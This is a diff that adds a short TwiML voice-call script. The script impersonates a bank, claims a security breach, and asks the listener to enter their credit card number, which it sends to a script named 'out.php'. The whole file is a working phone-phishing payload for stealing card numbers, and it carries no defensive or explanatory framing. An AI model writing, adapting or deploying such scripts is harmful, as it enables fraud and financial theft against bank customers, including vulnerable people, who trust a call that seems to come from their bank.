@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Gather action="out.php" method="GET">
+        <Say>
+            This is an important message from your bank.
+            Due to a recent security breach, we are issuing
+            new credit cards to all of our customers. To verify
+            your identity please enter your current card number
+            followed by the pound sign.
+        </Say>
+    </Gather>
+</Response>
